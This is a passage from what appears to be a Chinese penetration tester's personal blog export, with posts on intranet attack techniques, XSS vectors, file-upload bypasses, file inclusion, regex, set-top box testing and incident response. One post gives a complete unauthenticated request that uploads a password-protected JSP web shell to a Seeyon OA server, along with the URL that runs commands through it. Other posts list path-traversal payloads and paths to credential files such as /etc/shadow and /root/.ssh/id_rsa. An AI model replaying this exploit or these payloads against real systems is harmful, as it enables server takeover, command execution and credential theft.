网络拓扑探测。探测拓扑是个很头大的事，子内网和防火墙都会阻碍拓扑探测。大多也只能探测到上层网、公共网、内网服务器网的网络环境，再有些其他因素就导致探测的更少了。 内网弱口令。内网弱口令其实还是蛮多的，可以对同子网个人电脑、内网服务器、交换机、路由器尝试弱口令破解。 内网服务器漏洞。若在OA之类的内网办公通讯站点，可以挖到漏洞就可以获取到部分有助内网渗透的信息。 内网路由器漏洞。无论是上层网路由还是内网服务器网路由，只要拿下路由器那就是个很大的帮助，这样就可以进一步做端口映射和转发，更好的其搜集其他内网信息，扩大了攻击面。 内网个人电脑漏洞。例如利用17010之类的远程漏洞测试同子内网中的个人电脑，进而多搜集信息，以方便测试内网服务器。一个不错的内网信息搜集脚本：地址 内网钓鱼。和一般钓鱼思路差不多，不过内网中更容易让别人信任，可以通过OA和办公邮件进行钓鱼。 中间人攻击。不同环境下可以用不同的姿势，一般用的多的就是ARP欺骗、DNS欺骗、会话劫持，进行中间人攻击的前提是取得一定的内网权限。 内网穿透。在进行部分攻击时候，可能需要让其他内网电脑穿过外网出口进行辅助测试，这里推荐一篇不错的穿越边界的姿势，另外经过Web站点做代理进行穿透时候还需要做Web端口复用。 参考文献：黑盒渗透测试的一些姿势和个人总结","link":"/2019/02/28/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E8%B7%B3%E6%9D%BF%E6%94%BB%E5%87%BB/"},{"title":"如何挖src的漏洞","text":"对我来说，青春与意识不到自己的身体有关，而老年则经常与有意识地克服某种不幸或体内的痛苦有关。——梅·萨藤《过去的痛》 看看大佬怎么说！！！ 参考：https://mp.weixin.qq.com/s/yEPE3Xxo0_2g3GEKeDAOWg来源：国舜股份 讲道理其实还是要多实战，道理都懂，我就是懒。","link":"/2019/07/17/%E5%A6%82%E4%BD%95%E6%8C%96src%E7%9A%84%E6%BC%8F%E6%B4%9E/"},{"title":"富文本编辑器","text":"最近听某人说回忆，解释为什么我们总是随着自己老去，愈发的容易想起童年，想起我们最初的时光，只因为——那些最早来的，总是最后一个离开。——唐诺《读者时代》 前人栽树，后人乘凉。 链接: https://pan.baidu.com/s/1dqexujlZsrgyjLJx4C-6tw 提取码: 3k25","link":"/2019/07/23/%E5%AF%8C%E6%96%87%E6%9C%AC%E7%BC%96%E8%BE%91%E5%99%A8/"},{"title":"岁末总结","text":"当你不知道为了什么而活，那就努力去寻找，在这个寻找的过程中你就会明白什么是生命的意义 2019很快就过去了，回顾一整年，先说说目标： 1.Security+证书 Yes 2.阅读5本课外书 Yes 3.x万存款(真是不容易) Yes 4.3本专业书 No 5.提交5个高质量高危漏洞 No总的来说，全年总目标只完成了一半。因为今年确实国庆70周年，敏感时期，工作确实忙，再加上懒是原罪。目标4、5没有完成是很大的遗憾，来年再有机会静下心来慢慢挖。 再就是毕业也一年半了，感觉同学大家都变得很厉害，升职的、涨工资的、考研的等等都有。好像就我还在满足于三点一线的日常工作，技术也没有得到提升。因为单身，除了工作双休日也是划水，可能也是看淡了，觉得生活过得去就还行，快乐最重要，没必要把自己搞得太累。不行！明年要好好工作，挣钱买房了，早日实现经济自由，奥利给！！！","link":"/2019/12/30/%E5%B2%81%E6%9C%AB%E6%80%BB%E7%BB%93/"},{"title":"小白知识点(不定期更新...)","text":"有时，对你来说，错误的朋友是一个十全十美的好人，但是你因为错误的原因选择了她，并不是每一个本身是体面人的男人，都必定是你的良人，也不是每一个性情中人的女人，都必定是你的益友。有时，问题不在友人的任何一方，问题在于她们所拥有的友谊类型。——伊丽莎白·坎特《简·奥斯丁之幸福哲学》 网页后缀名@Override 重写父类的方法.@Nullable 表示定义的字段可以为空.一般情况下扩展名可以体现出一个网站使用的技术,xxx.html?id=xxx,这个就是普通的html页面,然后通过javascript或者vbscript来接受页面Get的提交 xxx.do?id=xxx, 这样的一般是用Java,和jsp开发的。再比如说用isapi开发的可以是 xx.dll php开发的是 .php 或者 .php3,perl开发的是 .pl .cgi 等等还有很多，就不一一举例了, 总之有很多技术都得靠服务器才能实现. 后缀名.do .jsp有什么区别 do可能是用struts编的，如果你对java Web有所了解的话，你应该知道struts，一般的jsp就是直接用.jsp结尾，在struts中你可以部署和设定后缀名，其实用tomcat也可以设定后缀名，你得修改一些配置 有比较大的可能是用STRUTS框架开发的,因为后缀可以自定,也有可能是其它的语言做的 Struts是一个基于Sun J2EE平台的MVC框架，主要是采用Servlet和JSP技术来实现的。由于Struts能充分满足应用开发的需求，简单易用，敏捷迅速，在过去的一年中颇受关注。Struts把Servlet、JSP、自定义标签和信息资源(message resources)整合到一个统一的框架中，开发人员利用其进行开发时不用再自己编码实现全套MVC模式，极大的节省了时间，所以说Struts是一个非常不错的应用框架。【StrutsIDE：用于Struts辅助开发的一个Eclipse插件】 使用Struts2框架的页面一般都是以.action结尾的，所以如果我们看到这种URL，可以考虑Struts2漏洞。.do是java，java喜欢这么写没做静态化时候做了静态化之后，才显示.html转载：https://www.cnblogs.com/XACOOL/p/5361901.html 目录浏览漏洞的预防：IIS中关闭目录浏览功能：在IIS的网站属性中，勾去“目录浏览”选项，重启IIS。 Apache中关闭目录浏览功能：打开Apache配置文件httpd.conf，查找“Options Indexes FollowSymLinks”，修改为“ Options -Indexes”(减号表示取消，保存退出，重启Apache)。 Nginx 中默认不会开启目录浏览功能，若您发现当前已开启该功能，可以编辑nginx.conf文件，删除如下两行：autoindex on;autoindex_exact_size on，然后重启Nginx。转载自CSDN博主「谢公子」的原创文章,原文链接：https://blog.csdn.net/qq_36119192/article/details/86496362 常见的敏感信息路径：Windows系统 c:\\boot.ini // 查看系统版本 c:\\windows\\system32\\inetsrv\\MetaBase.xml // IIS配置文件 c:\\windows\\repair\\sam // 存储Windows系统初次安装的密码 c:\\ProgramFiles\\mysql\\my.ini // MySQL配置 c:\\ProgramFiles\\mysql\\data\\mysql\\user.MYD // MySQL root密码 c:\\windows\\php.ini // php 配置信息Linux/Unix系统 /etc/passwd // 账户信息 /etc/shadow // 账户密码文件 /usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件 /usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置 /usr/local/app/php5/lib/php.ini // PHP相关配置 /etc/httpd/conf/httpd.conf // Apache配置文件 /etc/my.conf // mysql 配置文件 /root/.bash_history #查看历史命令 /root/.mysql_history #mysql历史命令记录文件 /var/lib/mlocate/mlocate.db #本地所有文件信息 /etc/ssh/sshd_config #ssh配置文件，如果对外开放可看到端口 /proc/self/fd/fd[0-9]*(文件标识符) /proc/mounts /porc/config.gz /root/.ssh/authorized_keys /root/.ssh/id_rsa /root/.ssh/id_ras.keystore /root/.ssh/known_hosts其他程序的配置文件apache： /etc/httpd/conf/httpd.conf /etc/apache2/httpd.conf /etc/apache2/apache2.confnginx： /etc/nginx/nginx.conf /usr/local/nginx/conf/nginx.conf /usr/local/etc/nginx/nginx.confredis： /etc/redis.confindex.php?f=../../../../../../etc/passwd 宽字节注入使用条件：1、使用addslashes（）函数（提交的符号用“\\”转义）；2、数据库设置编码吗为GBK格式。 原理：前端输入%df时，首先经过addslashes（）转义变成了%df%5c%27，之后，在数据库查询前，因为设置了GBK编码，GBK编码在汉字编码范围内的两个字节都会重新编码为一个汉字。然后，MySQL服务器就会对查询语句进行GBK编码，即%df%5c被编码成了“運”，而单引号就逃逸了出来，从而形成了注入漏洞。 参考链接index.do为后缀的是什么开发语言？ 有什么技术特点https://blog.csdn.net/qq_36119192/article/details/86496362","link":"/2019/08/23/%E5%B0%8F%E7%99%BD%E7%9F%A5%E8%AF%86%E7%82%B9-%E4%B8%8D%E5%AE%9A%E6%9C%9F%E6%9B%B4%E6%96%B0/"},{"title":"常见的xss攻击场景","text":"既有时间夺走的东西，又有时间给予的东西。把时间拉向自己这边是一项重要工作。 ——村上春树《刺杀骑士团长》 0x00 URL反射型当URL以某种方式显示在网页中。 123http://test.com/xss.php/&quot;&lt;svg onload=alert(1)&gt;&lt;form action=&quot;/xss.php&quot;&gt;&lt;svg onload=alert(1)&gt;&quot; method=&quot;POST&quot;&gt;&lt;br&gt; 0x01 简单的HTML注入(HTMLi)网页开发者没做任何安全措施，直接在标签里面，在标签前面或后面不需要闭合或逃逸任何的字符。任何XSS payload都能执行成功。 0x02 内联HTML注入(HTMLi)提前闭合标签，标签内注入新的标签。 0x03 内联HTML注入(HTMLi):不破坏标签当特殊符号被过滤或转义，插入事件属性来执行payload，比如onload，onmouseover 0x04 JS中的HTML注入(HTMLi)输入有时候会在javascript中（script标签），通常在代码的某个变量值中。需要注意的是HTML标签在浏览器的解析中有优先权，构造payload时要先闭合原来的标签，在插入新的标签。 0x05 简单的JS注入如果script标签被过滤，遵守js语法。 12http://test.com/xss.php?v1=&apos;-alert(1)-&apos;var v1=&apos;&apos;-alert(1)-&apos;&apos;; 0x06 逃逸JS注入转义转义字符。如果单引号被’\\’转义了，可以再插入转义字符’\\’转义转义字符。 12var v2=&apos;\\&apos;-alert(1)\\&apos;&apos;;var v3=&apos;\\\\&apos;-alert(1)-\\\\&apos;&apos;;","link":"/2019/01/31/%E5%B8%B8%E8%A7%81%E7%9A%84xss%E6%94%BB%E5%87%BB%E5%9C%BA%E6%99%AF/"},{"title":"文件上传漏洞","text":"人事太忙了，不许我们全神贯注，无间断地怀念一个人。我们一生对于最亲爱的人的想念，加起来恐怕不到一点钟，此外不过是念头在他身上瞥过，想到而已。 ——钱钟书《围城》 0x01 客户端检测绕过(javascript检测绕过)可以用firebug之类的插件禁用javascript执行或者通过burpsuite等代理工具进行绕过。 0x02 服务端检测绕过(MIME类型检测)修改请求包中的Content-Type,如将text/plain改为image/gif 0x03 服务器检测绕过(目录路径检测)检测路径是否合法 0x04 服务端检测绕过(文件扩展名检测)黑名单检测1.文件名大小写绕过2.名单列表绕过3.特殊文件名绕过：如发送的 http包里把文件名改成 test.asp. 或 test.asp_(下划线为空格)，这种命名方式在windows系统里是不被允许的，所以需要在 burp之类里进行修改，然后绕过验证后，会被windows系统自动去掉后面的点和空格，但要注意Unix/Linux系统没有这个特性。4.0x00截断绕过：%00，一般asp的程序常见此漏洞。5..htaccess绕过：配合名单列表绕过，上传一个自定义的.htaccess，就可以轻松绕过各种检测。6.解析调用/漏洞绕过 白名单检测1.0x00截断绕过2.解析调用/漏洞绕过 .htaccess.htaccess文件提供了一种目录级别的修改配置的方式。一个文件，包含一条或多条配置指令，放置于目录下，这些配置指令对当前目录和其所有子目录生效。 PHP manual中提到了下面一段话move_uploaded_file section,there is awarning which states‘ If the destination file already exists, it will be overwritten.’如果 PHP安全没配置好就可以通过 move_uploaded_file函数把自己写的.htaccess文件覆盖掉服务器上的,这样就能任意定义解析名单 一个自定义的.htaccess文件就可以以各种各样的方式去绕过很多上传验证机制，建立一个.htaccess文件，里面的内容如下&lt;FilesMatch “haha”&gt;SetHandler application/x-httpd-php通过一个.htaccess文件调用 php的解析器去解析一个文件名中只要包含”haha”这个字符串的任意文件， 所以无论文件名是什么样子， 只要包含”haha”这个字符串， 都可以被以 php的方式来解析。 0x05 服务端检测绕过(文件内容检测)文件幻数检测主要是检测文件内容开始处的文件幻数，比如图片类型的文件幻数如下：然后在幻数后面写入木马代码。 文件相关信息检测常用函数getimagesize()，在幻数的基础上伪造一下文件头。 文件加载检测调用 API或函数去进行文件加载测试。常见的是图像渲染测试，再变态点的甚至是进行二次渲染。1.对渲染/加载测试的攻击方式是代码注入绕过：不破坏文件本身的渲染情况下找一个空白区进行填充代码，一般会是图片的注释区。对于渲染测试基本上都能绕过，毕竟本身的文件结构是完整的。 二次渲染相当于是把原本属于图像数据的部分抓了出来，再用自己的API或函数进行重新渲染，在这个过程中非图像数据的部分直接就被隔离开了。2.对二次渲染的攻击方式是攻击文件加载器自身：溢出攻击 参考文献：Upload Attack Framework Version 1.0.CasperKid[Syclover][Insight-Labs],2011.10.6.","link":"/2019/02/13/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"title":"文件包含","text":"正因为无法选择出生的地方或成长的城市，人们才会对出生地、家乡有种近乎血缘关系的眷恋。一个地方一旦住下来，那里的空气或气味就会随着成长牢牢吸附在身上，渐渐形成身体的一部分。只是地名不同，那城市吹拂的风也不一样。居民的气息会在不知不觉间增强那座城市的气味 ——石内都《黑白》 0×01 文件包含简介服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP来执行，这会为开发者节省大量的时间。这意味着您可以创建供所有网页引用的标准页眉或菜单文件。当页眉需要更新时，您只更新一个包含文件就可以了，或者当您向网站添加一张新页面时，仅仅需要修改一下菜单文件（而不是更新所有网页中的链接。 文件包含函数PHP中文件包含函数有以下四种： require() require_once() include() include_once()include和require区别主要是，include在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而require函数出现错误的时候，会直接报错并退出程序的执行。 而include_once()，require_once()这两个函数，与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题。 漏洞产生原因文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意文件，导致了执行了非预期的代码。 示例代码 1234&lt;?php $filename = $_GET['filename']; include($filename);?&gt; 例如：$_GET[‘filename’]参数开发者没有经过严格的过滤，直接带入了include的函数，攻击者可以修改$_GET[‘filename’]的值，执行非预期的操作。 FreeBuf的这篇文章很详细了Web安全实战系列：文件包含漏洞,就不多复制人家的成果了。 参考链接：https://www.freebuf.com/articles/web/182280.html","link":"/2019/02/15/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"},{"title":"有点意思的XSS","text":"我们是多么迅速、多么频繁地改变着我们的生活和幻想啊！一些朋友离开了我们，另一些朋友又随之而去。我们的关系变化着：总有那个时候，我们不再拥有曾经拥有的东西；总有那个时候，我们对我们的过去一无所有。人不是只有一个生命，他有好几个，一个接着一个，而这是他的苦难。——夏多布里昂《墓中回忆录》 0x00前言xss漏洞真的是感觉很好挖但有不容易挖，前几天发现一个有意思的练习平台,试着去做了一下，学到了几点新姿势，在此记录一下。 0x01就是干p0 白给看到这个页面，先随便输入看看什么情况，如下图：其实第一关纯粹白给，啥也没过滤直接插就是了，成功弹窗。看到这个url，换个函数试试，嗯？有意思。。。继续往下搞。 p1 烦人的正则到这儿我就机智的先浏览了一下后面的关卡了，大多数和js正则有关系，所以还是需要有一定js基础。别问我，问就是不会，我赶紧看看笔记去……还是先尝试输入”&lt;”、”/“、”&gt;”等这类敏感字符，结合js正则，这句正则大概的意思是将”&lt;&gt;”括起来的内容置换成空。那我就不闭合呗 p2 换个payload这个就很容易懂了，直接过滤”=”和”(“过滤”=”好说，换个payload不就好了。但是还是有括号啊，编个码试一下em……好像还是不行，各种绕但卡在这里很久都不行，最后忍不住了还是看了一眼答案。什么？还有答案，网址我放文末吧，还是要自己先搞搞。其实我思路是对的….就差一点 p3 这个简单根据输入和代码的意思判断，将HTML注释符中的“-&gt;”替换成了下划线.HTML中的注释符又不止这一个,“–!&gt;”也是可以的后面的越来越难搞了，慢慢更新吧 答案","link":"/2019/06/23/%E6%9C%89%E7%82%B9%E6%84%8F%E6%80%9D%E7%9A%84XSS/"},{"title":"致远OA远程代码执行漏洞","text":"0x00 漏洞概述根据 https://www.cnvd.org.cn/webinfo/show/5095 的公告，该系统的漏洞点在于致远OA-A8系统的Servlet接口暴露，安全过滤处理措施不足，使得用户在无需认证的情况下实现任意文件上传。攻击者利用该漏洞，可在未授权的情况下，远程发送精心构造的网站后门文件，从而获取目标服务器权限，在目标服务器上执行任意代码。漏洞影响的产品版本包括： 致远A8-V5协同管理软件 V6.1sp1 致远A8+协同管理软件V7.0、V7.0sp1、V7.0sp2、V7.0sp3 致远A8+协同管理软件V7.1 0x01 漏洞详情访问http://xxxx/seeyon/htmlofficeservlet出现说明漏洞很大可能存在 0x02 POST包1234567891011121314151617POST /seeyon/htmlofficeservlet HTTP/1.1Content-Length: 1121User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)Host: xxxxxxxxxPragma: no-cacheDBSTEP V3.0 355 0 666 DBSTEP=OKMLlKlVOPTION=S3WYOSWLBSGrcurrentUserId=zUCTwigsziCAPLesw4gsw4oEwV66CREATEDATE=wUghPB3szB3Xwg66RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6originalFileId=wV66originalCreateDate=wUghPB3szB3Xwg66FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6needReadFile=yRWZdAS6originalCreateDate=wLSGP4oEzLKAz4=iz=66&lt;%@ page language=&quot;java&quot; import=&quot;java.util.*,java.io.*&quot; pageEncoding=&quot;UTF-8&quot;%&gt;&lt;%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp+&quot;\\n&quot;);}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();} %&gt;&lt;%if(&quot;asasd3344&quot;.equals(request.getParameter(&quot;pwd&quot;))&amp;&amp;!&quot;&quot;.equals(request.getParameter(&quot;cmd&quot;))){out.println(&quot;&lt;pre&gt;&quot;+excuteCmd(request.getParameter(&quot;cmd&quot;)) + &quot;&lt;/pre&gt;&quot;);}else{out.println(&quot;:-)&quot;);}%&gt;6e4f045d4b8506bf492ada7e3390d7ce 123456789101112DBSTEP V3.0 386 0 666 DBSTEP=OKMLlKlVOPTION=S3WYOSWLBSGrcurrentUserId=zUCTwigsziCAPLesw4gsw4oEwV66CREATEDATE=wUghPB3szB3Xwg66RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6originalFileId=wV66originalCreateDate=wUghPB3szB3Xwg66FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6needReadFile=yRWZdAS6originalCreateDate=wLSGP4oEzLKAz4=iz=66CLIENTIP=wLCXqUKAP7uhw4g5zi=6&lt;%@ page language=&quot;java&quot; import=&quot;java.util.*,java.io.*&quot; pageEncoding=&quot;UTF-8&quot;%&gt;&lt;%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp+&quot;\\n&quot;);}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();} %&gt;&lt;%if(&quot;asasd3344&quot;.equals(request.getParameter(&quot;pwd&quot;))&amp;&amp;!&quot;&quot;.equals(request.getParameter(&quot;cmd&quot;))){out.println(&quot;&lt;pre&gt;&quot;+excuteCmd(request.getParameter(&quot;cmd&quot;)) + &quot;&lt;/pre&gt;&quot;);}else{out.println(&quot;:-)&quot;);}%&gt; 0x03 验证上传成功后访问xxx/seeyon/test123456.jsp?pwd=asasd3344&amp;cmd=ifconfig 网上搜索到很多对应的oa，但最后的命令执行都失败了，不知道是都修复了还是哪一步出了问题","link":"/2019/07/17/%E8%87%B4%E8%BF%9COA%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"title":"正则表达式模式","text":"我觉得有目的或理想的人生，都不算是有趣的人生，因为那是靠结果来评价失败或成功的人生。那样的人生会产生不安与恐惧，变成不能享受人生过程中的每一件事情。 ——狩野由美子《蔬菜之神》 0x00 正则表达式的模式^ 匹配字符串的开头。 $ 匹配字符串的结尾。 . 匹配除了换行符的任意字符，但当re.DOTALL标记被指定时，则可以匹配包括换行符在内的任意字符。 ? 匹配前一个字符或子表达式0次或1次重复(非贪婪模式)。 […] 表示一组字符，单独列出：[amk]匹配”a”，”m”或”k”。 [^…] 匹配不在[]中的字符：[^abc]匹配除了a，b，c之外的字符。 re* 匹配0个或多个前面的字符或子表达式。 re+ 匹配1个或多个表达式。 re? 匹配0个或1个由前面正则表达式定义的片段(非贪婪模式)。 re{n} 精确匹配n个前面表达式。 re{n,} 匹配n个前面的表达式。 re{n,m} 匹配n到m次前面的表达式定义的片段，贪婪方式。 a | b 匹配a或b。 (re) 匹配括号内的表达式，也表示一个组。 \\w 匹配数字字母及下划线。 \\W 匹配非字母数字及下划线。 \\s 匹配任意空白字符，等价于[\\t\\n\\r\\f]。 \\S 匹配任意非空字符。 \\d 匹配任意数字，等价于[0-9]。 \\D 匹配任意非数字。 \\A 匹配字符串开始。 \\Z 匹配字符串结束，如果存在换行，只匹配到换行前的结束符。 \\z 匹配字符串结束。 \\G 匹配匹配最后完成的位置。 \\b 匹配一个单词的边界，就是单词和空格之间的位置。例如’er\\b’可以匹配’never’中的’er’，但不能匹配’verb’中’er’。 \\B 匹配非单词边界，’er\\B’能匹配’verb’中的’er’，不能匹配’never’中的’er’。 \\n,\\t 匹配换行符或制表符。 \\1…\\9 匹配第n个分组的内容。 正则表达式可以包含一些可选标志修饰符来控制匹配的模式。修饰符被指定为一个可选的标志。多个标志可以通过按位 OR(|) 它们来指定。如 re.I | re.M 被设置成 I 和 M 标志： 修饰符 描述 re.I 使匹配对大小写不敏感。 re.L 做本地化识别（locale-aware）匹配。 re.M 多行匹配，影响 ^ 和 $。 re.S DOTALL模式，使 “.” 匹配包括换行在内的所有字符。 re.U 根据Unicode字符集解析字符。这个标志影响 \\w, \\W, \\b, \\B。 re.X 该标志通过给予你更灵活的格式以便你将正则表达式写得更易于理解。 (?imx) 正则表达式包含三种可选标志：i, m, 或 x 。只影响括号中的区域。 (?-imx) 正则表达式关闭 i, m, 或 x 可选标志。只影响括号中的区域。 (?: re) 类似 (…), 但是不表示一个组。 (?imx: re) 在括号中使用i, m, 或 x 可选标志。 (?-imx: re) 在括号中不使用i, m, 或 x 可选标志。 (?#…) 注释. (?= re) 前向肯定界定符。如果所含正则表达式，以 … 表示，在当前位置成功匹配时成功，否则失败。但一旦所含表达式已经尝试，匹配引擎根本没有提高；模式的剩余部分还要尝试界定符的右边。 (?! re) 前向否定界定符。与肯定界定符相反；当所含表达式不能在字符串当前位置匹配时成功。 (?&gt; re) 匹配的独立模式，省去回溯。0x01 正则表达式-中级：1.子表达式对于192.168.10.1这样的地址如何写表达式呢？常规写法：\\d+.?\\d+.?\\d+.?\\d+，但这种太繁琐，而且控制不了位数。再就是：\\d+{1,3}.?\\d+{1,3}.?\\d+{1,3}.?\\d+{1,3}。简便写法：(\\d+{1,3}.){3}\\d+{1,3}.我们可以把几个字符组合用圆括号括起来，然后将圆括号内的内容当做一个整体字符。所以利用子表达式，将192.这种数字加小数点看做一个整体字符，规定其重复匹配的次数，高效又简洁。 2.向前向后查找?&lt;=后面跟着的是前缀要求，?=后面跟的是后缀要求。字符串”string”，匹配”rin”，r”(?&lt;=t)xx(?=g)”。 3.回溯引用对于正则表达式：[ ]+(\\w+)[ ]+\\1，(\\w+)是一个子表达式，这个子表达式不是用来进行重复匹配的，只是把整个模式的一部分单独划分出来以便在后面引用。\\1这是一个回溯引用，而它引用的正是前面划分出来的子表达式（即子表达式：(\\w+)），\\1它代表着模式里的第一个子表达式，\\2代表着模式里的第二个子表达式，\\3代表着模式里的第三个子表达式；以此类推。[ ]+(\\w+)[ ]+\\1将匹配同一个单词的连续两次重复出现，而且前面一个是一个单独的词，至少前面有一个空格。","link":"/2019/01/31/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F/"},{"title":"记一次尝试日志分析","text":"只是因为想你了。。。。 0x00 批量修改文件后缀在需要修改后缀名的同目录下新建一个bat文件(后缀名为.bat)，内容为:ren *.log *.txt保存点击bat文件运行即可修改该目录下所有.log文件为.txt文件。 0x01 批量修改文件编码格式偶然间发现Editplus是个不错的软件，这里可以批量修改文件的编码格式 EditPlus（文字编辑器）汉化版是一套功能强大，可取代记事本的文字编辑器，拥有无限制的撤消与重做、英文拼字检查、自动换行、列数标记、搜寻取代、同时编辑多文件、全屏幕浏览功能。而它还有一个好用的功能，就是它有监视剪贴板的功能，同步于剪贴板可自动粘贴进 EditPlus 的窗口中省去粘贴的步骤。本来想重点记录一下这个工具的使用过程的，无奈工作做完之后，后来想不起来安装在哪儿了可参考https://www.iteye.com/blog/fableking-1831343 0x02 编写脚本处理python写了一个简陋的过滤脚本，不得不说，自动化确实香主要关键字查找查询sqlmap的特征字符，未发现有dump数据的情况，后面就是差不多改脚本，重复过滤关键字的过程了","link":"/2020/03/04/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/"},{"title":"电视机顶盒安全测试","text":"我有时候觉得，这种“远方”的看不见的在灵魂聊涌动的事物，比近旁直观的事物更为深邃，也更难抵达。生活中，这种奇怪的莫名的“远方”总是牵动着我。但其实我知道，“远方”哪儿也不是，它不过是一个假想物，一个大幻想——或者是我们内心中冥冥守候的一个人。 ——陈染《与另一个自己相遇》 0x00 前言偶然的机会接触到了对电视机顶盒进行安全测试，这对于我来说完全是新的领域，果然不出所料最后也没有什么成果，但还是想总结一下，有新的发现就来更新。 0x00 机顶盒什么是机顶盒？ 网络电视机顶盒，是2012年开始兴起的一种电视互联网终端设备，也被称作互联网播放机、互联网高清播放机、电视伴侣、电视盒子、网络机顶盒等，亦常被简称作“盒子”。该设备的操作系统通常基于tvOS或Android或Linux，借由通过Wifi无线网络或以太网等实体线路与互联网进行连接。在连接互联网之后，可以实现在传统的电视上在线点播、在线电视直播、浏览网页、收看海外电视与电影、甚至是玩游戏。--维基百科 数字视频变换盒（Set Top Box）简称STB，通常称作机顶盒或机上盒，是一个连接电视机与外部信号源的设备。它可以将压缩的数字信号转成电视内容，并在电视机上显示出来。信号可以来自有线电缆、卫星天线、宽带网络以及地面广播。机顶盒接收的内容除了模拟电视可以提供的图像、声音之外，更在于能够接收数字内容，包括电子节目指南、因特网网页、字幕等等。 --百度百科0x01 机顶盒安全测试根据我的个人经验来理解，可以把机顶盒的安全测试分为以下几个模块： 硬件安全拆开机顶盒里面其实是一块开发板。 Andorid 安全机顶盒连上显示器，用遥控器进行操控，可以安装卸载应用，可以理解为Android系统，但事实是大部分机顶盒确实是一个Android系统。 APP 安全系统里面的应用除了可以自己在商店安装以外，预装应用都是以APK形式安装上去的。 Web安全(集成第三方服务)最后就是第三方集成到机顶盒里面了，机顶盒直接通过url或IP地址访问第三方服务器获取对应的服务。这类进行安全测试和日常的Web安全测试差不多太多。 0x02 总结有的机顶盒除了WLAN口，还有很多LAN口，具有路由或无线功能，这类机顶盒可以通过网络连接进行抓包改包什么的，测试起来比较方便。但有的机顶盒就只有一个WLAN口，没有LAN口，这类机顶盒就是我目前比较头疼的，遇到这种只能进行Andorid系统和APP安全的测试，如果大佬有高招请指点一下，谢谢，最后放个简单的结构图。","link":"/2019/03/19/%E7%94%B5%E8%A7%86%E6%9C%BA%E9%A1%B6%E7%9B%92%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"},{"title":"解决ss电脑端不能科学上网","text":"本来大家都认为家庭是和谐体，不久每个人都觉得自己是个陌生人，与大家不相称，到了某个时候，到达了某一个零界点，大家都觉得自己孤独，只能靠自己，只顾自己的事，自己和别的人没有任何关系。 ——阿尔诺·盖格尔《流放的老国王》 0x00 前言入了信息安全这行这么久连fq都不会，说来有点惭愧。前几天在某知乎大佬(坏笑.jpg)的帮助下成功搭好了梯子，然后手机成功f出去了，但我电脑不知道抽了什么筋死活f不了，查了一通资料最后完美解决，在此记录仅供个人备忘之用，用户将其信息做其他用途，由用户承担全部法律及连带责任。 0x01 设置本地代理首先我的操作系统是win10，我现在的梯子手机能用，只是电脑不能用。我电脑之前用过一个免费的梯子，当时是没有问题的，也隐约记得没改什么东西，装上小飞机就能用。”老哥”现在那个免费的梯子还能用，我就不行。 虽然不是很明白其中的原理，但我一开始就怀疑肯定是代理出了问题，所以我就重点设置代理，确保我和”老哥”的本地代理是一样的。”控制面板”-&gt;”internet选项(小图标)”-&gt;”连接”-&gt;”局域网设置” 然后win10中确保本地代理是打开的,”windows键”-&gt;”设置”-&gt;”网络和Internet”-&gt;”代理”。 0x02 系统代理因为不同浏览器使用过程中设置的代理方式不同，这里需要设置为系统代理。 0x03 总结确保以上两点，我这边就ok了！具体其他问题可以参考这篇注意梯子不用的时候本地代理一直开着可能会影响网络连通问题，要注意关闭。","link":"/2019/02/18/%E8%A7%A3%E5%86%B3ss%E7%94%B5%E8%84%91%E7%AB%AF%E4%B8%8D%E8%83%BDFQ/"},{"title":"记一次应急处理","text":"那时的我从没出过远门。我二十一岁，在一所州立大学里混日子，除了追女孩子、各种牌戏、诗歌、小说、买醉的乐趣之外，什么也没学到。我拖延着时间，什么有意义的事情也不做，等着看人生究竟会变成什么样。——托马斯·林奇《往来故土之间》 0x00前言元气满满的我今天还差10分钟就到公司了，突然接到领导一个电话，说有个事儿要我外出一趟。说是有家公司被入侵了，让我过去看看，还说要流量分析(后来发现是我在地铁听错了，是日志分析)，我给你讲我就这个表情 0x01开搞一到办公室，连坐都没给我安排一下，让我先扫描一下服务器，我账号过期了，就只好先让远程的老哥用扫描器扫一下。日志分析我之前没搞过，也不知道怎么个操作法。这边我就先快速的扫了几眼，也没发现什么有用的信息。主要看的是系统日志，我问客户有没有web应用的日志，我想居然系统权限都被获取了，有可能是通过web应用进来的，结果客户跟我说没有web日志。 老哥那边也来消息了，扫描无果。嗯？咋回事捏，而且我扫一下服务器，发现开放的端口也不对，结果客户说对外做了映射，不是同一台服务器。 